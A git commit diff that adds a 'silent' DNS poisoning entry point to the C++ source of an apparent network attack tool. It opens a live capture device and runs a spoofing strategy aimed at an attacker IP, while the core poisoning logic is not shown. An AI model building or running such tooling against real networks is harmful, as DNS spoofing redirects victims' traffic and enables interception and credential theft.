af53d6819cb4c38407ee8344e20f7db770cc0c9e
Kala-Konarev <kkonarev144@gmail.com>
2025-05-20 15:45:44 +0200

    Add silent pois. options builder

--- core/src/dns_poisoning/public.cpp
+++ core/src/dns_poisoning/public.cpp
@@ -4,14 +4,12 @@
 #include "PcapLiveDeviceList.h"
 #include "dns_poisoning/all_out.h"
 #include "dns_poisoning/dns_poisoning_strategy.h"
+#include <dns_poisoning/silent.h>
 #include <memory>
 #include <stdexcept>
 #include <utility>
 
-/**
- * In the current implementation this method will not terminate and keep
- * peforming the attack.
- */
+// TODO (kala and nick) document this
 void ATK::DNS::allOutPoison(const AllOutPoisoningOptions &options) {
     pcpp::PcapLiveDevice *device =
         pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
@@ -24,6 +22,27 @@ void ATK::DNS::allOutPoison(const AllOutPoisoningOptions &options) {
     std::unique_ptr<ATK::DNS::AllOutDnsPoisoningStrategy> strategy;
     const pcpp::IPv4Address attackerIp(options.attackerIp);
     strategy = AllOutDnsPoisoningStrategy::Builder(device)
+                   .attackerIp(attackerIp)
+                   .build();
+
+    DnsPoisoningContext dnsPoisoningContext(std::move(strategy));
+
+    dnsPoisoningContext.execute();
+}
+
+// TODO (kala and nick) document this
+void ATK::DNS::silentPoison(const SilentPoisoningOptions &options) {
+    pcpp::PcapLiveDevice *device =
+        pcpp::PcapLiveDeviceList::getInstance().getPcapLiveDeviceByIpOrName(
+            options.ifaceIpOrName);
+
+    if (device == nullptr || !device->open()) {
+        throw std::runtime_error("Couldn't open device");
+    }
+
+    std::unique_ptr<ATK::DNS::SilentDnsPoisoningStrategy> strategy;
+    const pcpp::IPv4Address attackerIp(options.attackerIp);
+    strategy = SilentDnsPoisoningStrategy::Builder(device)
                    .attackerIp(attackerIp)
                    .build();
 
